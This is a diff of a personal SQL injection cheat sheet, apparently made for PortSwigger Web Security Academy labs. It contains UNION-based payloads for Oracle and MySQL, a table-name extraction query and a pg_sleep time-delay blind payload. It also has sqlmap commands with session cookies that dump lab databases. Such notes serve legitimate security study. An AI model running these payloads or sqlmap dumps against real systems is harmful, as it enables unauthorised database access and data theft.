@@ -9,7 +9,7 @@ for oracle---
 
 for MySQL and Microsoft---
 '+UNION+SELECT+'abc','def'#
-'+UNION+SELECT+@@version,+NULL#
+'+UNION+SELECT+@@version+NULL#
 
 extracting tables from oracle db
 '+UNION+SELECT+table_name,NULL+FROM+all_tables--
@@ -78,8 +78,11 @@ sqlmap -u 'https://0af800e604055c7d819e399800bf00c6.web-security-academy.net/fil
 sqlmap -u 'https://0af8009d04c75cb982ec1fad00b000f3.web-security-academy.net/' --cookie='TrackingId=vXlhdCuFfEh7btYf; session=vOVSLroAEJ568bYWzcLsRf7OY9fKVohP' --level 2 --dbms=oracle --dump --threads=5
 
 
- **Time Dealys sql:**
+** Blind SQL injection with time delays**
  Cookie: TrackingId=x' || pg_sleep(10)--; session=
+
+**Blind SQL injection with time delays and information retrieval**
+ 
 ## Summary
 
 * [Recon for SQLi Vulnerabilities](#recon)
